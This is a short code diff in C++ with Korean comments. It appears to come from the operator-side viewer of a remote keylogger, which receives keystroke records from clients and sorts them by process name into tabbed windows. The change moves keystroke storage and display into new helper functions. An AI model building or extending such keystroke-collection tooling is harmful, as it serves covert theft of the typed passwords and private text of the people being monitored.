@@ -109,10 +109,8 @@ void CClient::ReceiveKeylog(PDUKeylog* pdu)
 		// 프로세스 리스트에 추가
 		m_keylogs.push_back(new CClientKeylog(pdu->process_name));
 	}
-	if (pdu->state == VK_RETURN) // Line Feed 이면
-		m_keylogs[i]->m_client_keylog += L"\x0a\x0d"; // CRLF로 만들어줌
-	else
-		m_keylogs[i]->m_client_keylog += pdu->state; // 내부에 키로그 기록
+
+	m_keylogs[i]->ScanKeylog(pdu); // 내부에 키로그 데이터 저장
 
 	if (!m_hWnd) // 창이 안띄워져 있을땐 업데이트x
 		return;
@@ -131,7 +129,7 @@ void CClient::UpdateKeylog(UINT index)
 	{
 		m_tab_client_keylog.InsertItem(index, m_keylogs[index]->GetProcessName()); // 탭 메뉴를 만듬
 		m_keylogs[index]->Create(IDD_DIALOG_CLIENT_KEYLOG, &m_tab_client_keylog); // 출력창을 탭 메뉴 안에 생성함
-		
+
 		// 탭 위치, 크기, 보이기 등 설정
 		CRect size;
 		m_tab_client_keylog.GetWindowRect(&size);
@@ -141,7 +139,7 @@ void CClient::UpdateKeylog(UINT index)
 		m_keylogs[m_tab_client_keylog.GetCurSel()]->ShowWindow(SW_HIDE);
 		m_keylogs[m_tab_client_keylog.GetCurSel()]->ShowWindow(SW_SHOW);
 	}
-	m_keylogs[index]->UpdateData(FALSE); // 데이터 출력까지
+	m_keylogs[index]->PrintKeylog(); // 데이터 출력까지
 }
 
 
